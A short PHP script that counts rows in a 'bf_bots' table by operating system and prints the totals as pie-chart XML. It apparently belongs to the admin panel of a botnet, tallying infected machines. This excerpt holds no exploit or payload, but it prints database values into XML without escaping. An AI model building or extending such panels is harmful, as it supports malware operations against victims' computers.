<?php

$list = array();

function reasult_data($row){
	global $list;
	if(isset($row->os))
	$list[strtoupper($row->os)] = $row->count;
}

$result = $mysqli->query('SELECT os, COUNT(os) count FROM bf_bots GROUP by os', null, 'reasult_data', false);

print('<?xml version="1.0" encoding="UTF-8"?>');
print('<pie>');

$all_count = array_sum($list);
$other_count = '0';

$i=0;
foreach($list as $key => $value){
	$i++;
	if(number_format(($value / $all_count) * 100, 2) > '1.5'){
		print('<slice title="'.$key.'">'.$value.'</slice>');
	}else{
		$other_count += $value;
	}
}
if($other_count > 0) print('<slice title="'.$lang['ostalnie'].'" pull_out="true">'.$other_count.'</slice>');
print('</pie>');
?>